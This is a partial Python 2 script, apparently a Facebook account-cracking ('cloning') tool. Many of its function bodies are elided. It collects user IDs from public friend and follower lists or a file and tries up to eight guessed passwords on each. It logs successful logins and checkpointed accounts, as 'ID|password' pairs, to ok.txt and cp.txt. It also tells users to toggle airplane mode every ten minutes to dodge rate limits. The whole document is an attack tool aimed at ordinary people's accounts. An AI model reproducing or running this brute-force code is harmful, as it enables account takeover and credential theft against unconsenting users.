...
print
'\x1b[0;97m[!]Wait a moment Checking Network and License'
...
def main():
    ...
    logo()
    print
    '\t\x1b[97;1m      MAIN MENU\x1b[0m'
    print
    ''
    print
    '\x1b[97;1m  [1] PUBLIC AND FOLLOWER CLONING \x1b[92;1m(Login)'
    print
    '\x1b[97;1m  [2] 2004 RANDOM OLD ID CLONING \x1b[92;1m(W-Login)'
    print
    '\x1b[97;1m  [3] 2009 RANDOM OLD ID CLONING \x1b[92;1m(W-Login)'
    print
    '\x1b[97;1m  [4] CONTACT TO OWNER'
    print
    '\x1b[97;1m  [0] EXIT'
    print
    ''
...
def log_sel():
    ...
    if sel == '':
        print
        '\t\x1b[91;1m  SELECT AN OPTION STUPID -_'
        log_sel()
...
def acc2004():
    ...
    ''
    print
    'This Is Not Available Yet Plz Wait For Update'
    print
    ''
...
def menu():
    ...
    try:
        ...
        ''
        print
        '\x1b[91;1m     LOGGED IN TOKEN HAS EXPIRED'
        os.system('rm -rf vau_token.txt')
        print
        ''
        time.sleep(1)
    ...
    ''
    print
    '\x1b[98;1mHELLOO   :      \x1b[98;1m' + xn
    print
    '\x1b[98;1mREGION   :      \x1b[98;1m' + loc
    print
    '\x1b[98;1mYOUR IP  :      \x1b[98;1m' + ip
    print
    ''
    print
    ''
    print
    '\x1b[98;1m  [1] CRACK WITH AUTO PASS'
    print
    '\x1b[98;1m  [2] CRACK WITH DIGIT PASS'
    print
    '\x1b[91;1m  [0] BACK'
    print
    ''
...
def crack1():
    ...
    ''
    print
    '\t\x1b[98;1m CRACK WITH AUTO PASS'
    print
    ''
    print
    '\x1b[98;1m  [1] CRACK PUBLIC ID'
    print
    '\x1b[98;1m  [2] CRACK FOLLOWERS'
    print
    '\x1b[98;1m  [3] CRACK FILE'
    print
    ''
    crack_select1()
...
def crack_select1():
    ...
    if select == '1':
        ...
        ''
        print
        '\t\x1b[98;1m MULTI PUBLIC ID COINING '
        print
        ''
        ...
        for t in range(id_limit):
            ...
            try:
                ...
                print
                '\x1b[91;1m  THIS ACC FRIENDLIST IS NOT PUBLIC'

            print
            '\x1b[92;1m  TOTAL IDS  : \x1b[0;92m%s\x1b[0;97m' % len(id)
        ...
        ''
        print
        '      \x1b[92;1mMULTI FOLLOWERS ID COINING '
        print
        ''
        ...
        for t in range(id_limit):
            ...
            try:
                ...
                print
                '\x1b[91;1m  THIS ACC FOLLOWER IS NOT PUBLIC'
        ...
        try:
            ...
            print
            '\t\x1b[91;1m  REQUESTED FILE NOT FOUND'
            print
            ''
    ...
    ''
    print
    '\x1b[97;1m  TOTAL IDS : \x1b[92;1m' + str(len(id))
    print
    '\x1b[97;1m  BRUTE HAS BEEN STARTED\x1b[0m'
    print
    '\x1b[97;1m  AEROPLANE MODE EVERY 10 MINT.'
    linex()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in data.text and 'EAAA' in data.text:
                print
                ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('ok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                ...
                print
                ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                if 'access_token' in data.text and 'EAAA' in data.text:
                    print
                    ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('ok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    ...
                    print
                    ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'access_token' in data.text and 'EAAA' in data.text:
                        print
                        ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('ok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        ...
                        print
                        ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('cp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'access_token' in data.text and 'EAAA' in data.text:
                            print
                            ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            ...
                            print
                            ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('cp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'access_token' in data.text and 'EAAA' in data.text:
                                print
                                ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('ok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                ...
                                print
                                ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                cp = open('cp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                if 'access_token' in data.text and 'EAAA' in data.text:
                                    print
                                    ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    ...
                                    print
                                    ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    if 'access_token' in data.text and 'EAAA' in data.text:
                                        print
                                        ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        ...
                                        print
                                        ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print
                                            ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass8 + '\n')
                                            ok.close()
                                            ...
                                            print
                                            ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass8 + '\n')
                                            cp.close()
    ...
    ''
    print
    '\x1b[98;1m THE PROCESS HAS BEEN COMPLETED'
    print
    '\x1b[98;1m TOTAL \x1b[92;1mOK\x1b[92;1m/\x1b[98;1mCP: ' + str(len(oks)) + '/' + str(len(cps))
    print
    ''
    linex()
    print
...
def crack_select():
    ...
    if select == '1':
        ...
        for t in range(id_limit):
            ...
            try:
                ...
                print
                '\x1b[91;1m  THIS ACC FRIEDLIST IS NOT PUBLIC'

            print
            '\x1b[94;1m  TOTAL IDS  : \x1b[0;92m%s\x1b[0;97m' % len(id)
    ...
    ''
    print
    '\x1b[98;1m  TOTAL IDS : \x1b[92;1m' + str(len(id))
    print
    '\x1b[98;1m  BRUTE HAS BEEN STARTED\x1b[0m'
    print
    '\x1b[98;1m  AEROPLANE MODE EVERY 10 MINT.'
    linex()
    ...
    '\x1b[98;1m THE PROCESS HAS BEEN COMPLETED'
    print
    '\x1b[98;1m TOTAL \x1b[92;1mOK\x1b[98;1m/\x1b[91;1mCP: ' + str(len(oks)) + '/' + str(len(cps))
    print
    ''
    linex()
    print
